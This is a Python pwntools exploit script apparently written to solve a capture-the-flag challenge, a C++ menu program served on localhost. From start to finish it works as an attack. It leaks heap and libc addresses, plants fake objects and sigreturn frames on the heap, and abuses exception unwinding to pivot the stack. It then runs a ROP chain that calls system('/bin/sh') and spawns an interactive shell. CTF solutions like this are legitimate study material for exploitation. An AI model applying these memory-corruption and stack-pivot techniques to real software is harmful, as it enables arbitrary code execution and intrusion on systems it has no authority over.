#!/usr/bin/env python3

from pwn import *

context.bits = 64
context.arch = 'x86_64'

def mkchall(x, name):
    if isinstance(name, str):
        name = name.encode()
    x.sendlineafter(b">_ ", b"1")
    x.sendlineafter(b"House of ", name)

def pubchall(x, name, points, flag):
    x.sendlineafter(b">_ ", b"2")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"How many points should this challenge have?\n", str(points).encode())
    x.sendlineafter(b"What should the flag be?\n", flag.encode())

def breakchall(x, name, reason):
    x.sendlineafter(b">_ ", b"3")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"Terminate input with a . on a single line\n", reason)
    x.sendline(b".")

def solvechall(x, name, flag):
    x.sendlineafter(b">_ ", b"4")
    x.sendlineafter(b"What challenge?\n", f"House of {name}".encode())
    x.sendlineafter(b"Enter flag: ", flag)

def exit(x):
    x.sendlineafter(b">_ ", b"5")

s = remote("localhost", 1337)
e = ELF("./chall")

def heapleak(x, points=42, name="heapleak", invalid_flag="invalid", valid_flag="flag{}"):
    mkchall(x, name)
    pubchall(x, name, points, invalid_flag)
    x.recvuntil(b"Error releasing challenge ")
    leak = int(x.recvuntil(b", try again.", drop=True).decode(), base=16)
    x.sendlineafter(b"How many points should this challenge have?\n", str(points).encode())
    x.sendlineafter(b"What should the flag be?\n", valid_flag.encode())
    return leak


nonfatal_crashpad = e.symbols['_ZN3CTF4playEv']+29
invalid_input_crashpad = e.symbols['_ZN3CTF13release_challEv']+1151

def main():
    heap = heapleak(s) - 0x13f10
    log.success(f"heap @ {hex(heap)}")

    x = s
    
    # we craft a fake released_challenge that we use to leak from by setting the name pointer
    # to a libc got pointer. We will hijack control flow so that we will enter the ReleasedChall
    # constructor with a pointer to this controlled. The AlreadyReleasedException thrown will
    # contain the leaked data.
    fake_released_chall = heap + 0x14550 + len("rlsdchll")
    log.info(f"fake ReleasedChallenge @ {hex(fake_released_chall)}")
    mkchall(x, b"fakecnk")
    breakchall(x, "fakecnk", b"rlsdchll"+fit({
        0x00: p64(e.symbols['_ZTV17ReleasedChallenge'] + 0x10), # vtable_for_ReleasedChallenge + 0x10
        0x08: p64(e.symbols['got.__libc_start_main']), #name
        0x10: p64(0x8),
        0x18: p64(0x8),
        0x20: p64(0x00),
        0x28: p64(0x2a),
        0x30: p64(e.symbols['got.__libc_start_main']),
        0x38: p64(0x11),
        0x40: p64(0x11),
        0x48: p64(0x00),
        0x50: p64(0x2a),
    }))

    # We will also store what looks like a sigreturn opcode, to confuse
    # MD_FALLBACK_FRAME_STATE_FOR.
    sigreturn_address = heap + 0x144d0 + len("House of sigrtnck")
    log.info(f"sigreturn @ {hex(sigreturn_address)}")
    mkchall(x, b"sigrtnck" + fit({
        0x00: p8(0x48),
        0x01: p64(0x50f0000000fc0c7),
    }))

    CTF_object = heap + 0x12ec0
    log.info(f"CTF object @ {hex(CTF_object)}")

    # We craft a fake stack on the heap. This is what RSP will point to when we
    # land on the crashpad.
    fake_stack_addr = heap + 0x15250 + len("stacstac") #0x161f0
    log.info(f"fake stack @ {hex(fake_stack_addr)}")
    fake_stack = fit({
        3656: p64(0), # for free in release_chall
        3888: p64(fake_released_chall),  # stack.challenge
        3896: p64(0), # for free in CTF::play
        3936: p64(nonfatal_crashpad), # this will print our leak
        3992: p64(CTF_object), # this for CTF::play, so we end up back in interactive loop
    }, length=4096)
    mkchall(x, b"fakestk")
    breakchall(x, "fakestk", b"stacstac" + fake_stack)

    # We craft a sigreturn frame on the heap. This may contain newline characters.
    # It will pivot the stack to the heap, and the rip to our target crashpad.
    fake_sigreturn_heap_addr = heap + 0x16370 + len(b"sigretnframesigretnframe")
    log.info(f"sigreturn context @ {hex(fake_sigreturn_heap_addr)}")
    fake_sigreturn_heap = SigreturnFrame(kernel='amd64')
    fake_sigreturn_heap.rsp = fake_stack_addr + 3592 # +3592 so call frames on the new stack does't clobber heap and so the stack is 16 byte aligned for xmmwords
    fake_sigreturn_heap.rip = invalid_input_crashpad   # crashpad
    mkchall(x, b"fake_sigreturn_frame")
    breakchall(x, "fake_sigreturn_frame", b"sigretnframesigretnframe" + bytes(fake_sigreturn_heap))

    # We craft a sigreturn frame to go on the stack. The first may not contain any newline characters.
    # It will hold a rsp register pointing to the next sigreturn frame on the heap, so that
    # unwinding will continue on the heap.
    fake_sigreturn_stack = SigreturnFrame(kernel='amd64')
    fake_sigreturn_stack.rsp = fake_sigreturn_heap_addr
    fake_sigreturn_stack.rip = sigreturn_address
    assert b'\n' not in bytes(fake_sigreturn_stack)
    leak_payload = flat({
        0x48: p64(sigreturn_address) + bytes(fake_sigreturn_stack)
    })
    assert b"\n" not in leak_payload
    solvechall(x, "heapleak", leak_payload)
    x.recvuntil(b"Yo you already released ")

    libc = ELF("./libc-2.33.so")
    libc.address = u64(x.recvuntil(b"\x1b[0m", drop=True).strip().ljust(8, b"\x00")) - libc.symbols['__libc_start_main']
    log.success(f"libc @ {hex(libc.address)}")

    rop = ROP(e)
    log.info(f"/bin/sh @ {hex(next(libc.search(b'/bin/sh')))}")
    rop.raw(e.symbols['__libc_csu_init']+99) # pop rdi; ret
    rop.raw(next(libc.search(b'/bin/sh')))
    rop.call(libc.symbols['system'])
    log.info(f"ropchain: \n{rop.dump()}")

    # ------------------- [ STAGE 2 ] ---------------------
    # We now do the same thing again, crafting fake sigreturn contexts
    # on the stack and on the heap, pivoting to a new fake stack on the
    # heap. This new fake stack has a rop chain.

    fake_stack_addr = heap + 0x16660 + len("ROPSTACK")
    log.info(f"fake stack @ {hex(fake_stack_addr)}")
    fake_stack = fit({
        3656: p64(0), # for free in release_chall
        3888: p64(fake_released_chall),  # stack.challenge
        3896: p64(0), # for free in CTF::play
        3936: p64(nonfatal_crashpad), # this will print our leak
        3992: p64(CTF_object), # this for CTF::play, so we end up back in interactive loop
        4032: rop.chain()
    }, length=4096)
    mkchall(x, b"ropstack")
    breakchall(x, "ropstack", b"ROPSTACK" + fake_stack)

    # We craft a sigreturn frame on the heap. This may contain newline characters.
    # It will pivot the stack to the heap, and the rip to our target crashpad.
    fake_sigreturn_heap_addr = heap + 0x17780 + len(b"sgnlropframesgnlropframe")
    log.info(f"sigreturn context @ {hex(fake_sigreturn_heap_addr)}")
    fake_sigreturn_heap = SigreturnFrame(kernel='amd64')
    fake_sigreturn_heap.rsp = fake_stack_addr + 3592 # +3592 so call frames on the new stack does't clobber heap and so the stack is 16 byte aligned for xmmwords
    fake_sigreturn_heap.rip = invalid_input_crashpad # crashpad
    mkchall(x, b"fake_sigretrop_frame")
    breakchall(x, "fake_sigretrop_frame", b"sgnlropframesgnlropframe" + bytes(fake_sigreturn_heap))

    # We craft a sigreturn frame to go on the stack. The first may not contain any newline characters.
    # It will hold a rsp register pointing to the next sigreturn frame on the heap, so that
    # unwinding will continue on the heap.
    fake_sigreturn_stack = SigreturnFrame(kernel='amd64')
    fake_sigreturn_stack.rsp = fake_sigreturn_heap_addr
    fake_sigreturn_stack.rip = sigreturn_address
    assert b'\n' not in bytes(fake_sigreturn_stack)
    leak_payload = flat({
        0x48: p64(sigreturn_address) + bytes(fake_sigreturn_stack)
    })
    assert b"\n" not in leak_payload
    ui.pause()
    solvechall(x, "heapleak", leak_payload)
    s.sendlineafter(b">_ ", b"5\n")
    log.success("spawning shell")
    s.interactive()
if __name__ == '__main__':
    main()
